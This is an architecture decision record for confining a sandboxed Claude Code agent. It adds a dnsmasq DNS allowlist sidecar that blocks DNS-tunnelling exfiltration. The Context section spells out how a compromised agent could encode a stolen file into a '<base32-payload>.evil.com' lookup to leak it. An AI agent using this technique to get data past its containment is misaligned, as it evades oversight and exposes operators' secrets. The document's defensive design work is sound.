# 20. L3 DNS allowlist (dnsmasq with default-deny forwarder)

Date: 2026-04-29
Status: Accepted

## Context

The L2 egress proxy ([ADR-0019](0019-l2-egress-proxy-tinyproxy.md)) blocks the agent from *connecting* to non-allowlisted hosts. But it does not stop the agent from *resolving* their names — and DNS resolution is itself an information-disclosure channel.

A compromised agent could :
1. Read a sensitive file (blocked by L1 / L3-FS, but assume bypass).
2. Encode the contents in a hostname like `<base32-payload>.evil.com`.
3. Issue `getaddrinfo("<base32-payload>.evil.com")` — Docker's embedded DNS resolves it via the host's upstream DNS.
4. The query reaches evil.com's authoritative nameserver. The payload is exfiltrated, even though the agent never actually connects to evil.com.

This is the classic **DNS tunneling / DNS exfiltration** pattern. It's listed as risk **R-DNS-LEAK** in v0.1's threat model and was carried forward as a v0.2 limitation.

## Decision

Add a **`dns-filter`** sidecar service running **dnsmasq** with `no-resolv` and a per-domain forwarder allowlist. The agent's `dns:` directive in docker-compose points exclusively at this sidecar's static IP ; Docker's default 127.0.0.11 resolver is bypassed.

dnsmasq config posture :

```
no-resolv      # no default upstream — unmatched queries have no place to go
no-poll        # don't watch for /etc/resolv.conf changes
no-hosts       # ignore the container's /etc/hosts inheritance

# Allowlist : queries for *.anthropic.com are forwarded to public DNS.
server=/anthropic.com/1.1.1.1
server=/anthropic.com/8.8.8.8
```

A query that doesn't match any `server=` rule has no upstream — dnsmasq returns SERVFAIL. The agent's `getaddrinfo("evil.com")` fails before any packet leaves the host's primary network interface.

Why **dnsmasq** :
- The standard tool for exactly this job — every Linux distro ships it ; every embedded gateway uses it.
- `--server=/<domain>/<upstream>` is exactly the allowlist primitive we need.
- ~150 KB binary, single-file config, no daemon-config plumbing.
- alpine 3.20 ships 2.90 (released 2024) — we pin `dnsmasq=2.90-r3`.

Why not **a custom Python/Go DNS server** :
- Same supply-chain argument as ADR-0019. Building DNS in 2026 means re-implementing the parser of a 30-year-old protocol with subtle edge cases (truncation, EDNS0, DNSSEC). Not the value-add of this project.

Why not **/etc/hosts pinning + drop DNS entirely** :
- Works in theory : write `1.2.3.4 api.anthropic.com` and remove the `dns:` directive. But api.anthropic.com is a CDN ; its IP changes weekly. Pinning the IP would require a watchdog to re-resolve and update /etc/hosts. dnsmasq does this natively via cache + TTL.

The **agent's** `dns:` is set to `[172.30.42.3]` (the dns-filter sidecar's static IP). The agent cannot resolve `dns-filter` by service name (Docker's embedded DNS would have to do that — and we just bypassed it), so the IP must be hardcoded.

The **egress-proxy's** DNS is left at Docker's default — the proxy needs to resolve `api.anthropic.com` to relay the agent's CONNECT request, and it doesn't make sense to filter the proxy's own DNS twice. Defense-in-depth : even if the proxy resolves evil.com, it can't connect because the agent is upstream of the proxy and the agent can't ask the proxy for evil.com (no DNS resolution on agent's side).

## Consequences

**Positive — what becomes easier or stronger** :
- R-DNS-LEAK from the v0.1 threat model is closed. The agent literally has no resolver path to evil.com.
- The dnsmasq query log (`log-queries log-facility=-` → stdout) is a per-DNS-call audit trail. Every query the agent issues is visible to `docker logs secured-claude-dns`.
- Combining L1 (Cerbos) + L2 (egress proxy) + L3-DNS (this ADR) gives **three independent allowlists** for any "agent talks to the internet" intent. Compromise of one layer is bounded by the next.

**Negative — what becomes harder or riskier** :
- Adds a fourth container (was 3 with the egress-proxy ADR). Compose file ~30 lines longer.
- The agent loses Docker's service-name DNS resolution (`cerbos`, `egress-proxy`). Mitigated by the agent never *needing* to resolve those — `egress-proxy` is reached via static IP in `HTTPS_PROXY`, `cerbos` is host-side and reached via `host.docker.internal` (which is in `extra_hosts`, bypassing DNS). Verified by inspecting hook.py + entrypoint.sh : the only hostname the agent resolves is `api.anthropic.com`.
- Static IPs require a custom subnet (172.30.42.0/29). Subnet collision risk same as ADR-0019.
- A future Claude Code release that ships its own DNS resolver bypassing libc would route around this. Mitigated by the audit-demo R-DNS-DENIED scenario asserting the post-resolution behaviour.

**Neutral — trade-offs we accept** :
- The dns-filter container is **not `read_only`** — same trade-off as egress-proxy (apk-install at boot pattern). Same v0.3 ticket.
- DNS resolution adds ~1 ms cached / ~5 ms uncached overhead. Imperceptible.

## Alternatives considered

- **Block egress to public DNS at L2** — the egress-proxy already enforces destination allowlist for HTTPS, but DNS is UDP/53 by default. Adding port 53 ACLs to the proxy would require switching tinyproxy → squid (which can do generic TCP proxying). Cost outweighs the benefit ; dnsmasq does this directly.
- **Disable DNS in the container entirely** — set `dns: ["0.0.0.0"]` and pin api.anthropic.com via /etc/hosts. Works briefly until the IP rotates. Operational nightmare.
- **DoH (DNS-over-HTTPS) sidecar** — would route DNS queries through the egress-proxy for filtering. Adds a layer of indirection for marginal benefit ; dnsmasq is already the simpler answer for our threat model.

## Verification

- **In-tree end-to-end test** :
  ```
  $ docker compose up -d dns-filter
  $ docker exec secured-claude-dns nslookup api.anthropic.com 127.0.0.1
  Server:  127.0.0.1 / Address: 127.0.0.1:53
  Non-authoritative answer:
  Name:    api.anthropic.com
  Address: 160.79.104.10            # ← resolved

  $ docker exec secured-claude-dns nslookup evil.com 127.0.0.1
  Server:  127.0.0.1 / Address: 127.0.0.1:53
  ** server can't find evil.com: REFUSED   # ← default-deny
  ```
- **Audit-demo scenario R-DNS-DENIED** asserts a non-allowlisted hostname returns SERVFAIL/REFUSED on every release.
- **Renovate** tracks the alpine base digest + the dnsmasq package version.

## References

- [ADR-0010](0010-network-egress-filter-allowlist.md) — L2 / L3 architectural intent
- [ADR-0019](0019-l2-egress-proxy-tinyproxy.md) — companion L2 HTTP egress proxy
- v0.1 threat model R-DNS-LEAK : `SECURITY.md` Layer 3 row + `docs/security/threat-model.md`
- dnsmasq upstream : https://thekelleys.org.uk/dnsmasq/doc.html
- alpine 3.20 dnsmasq package : https://pkgs.alpinelinux.org/package/v3.20/main/x86_64/dnsmasq
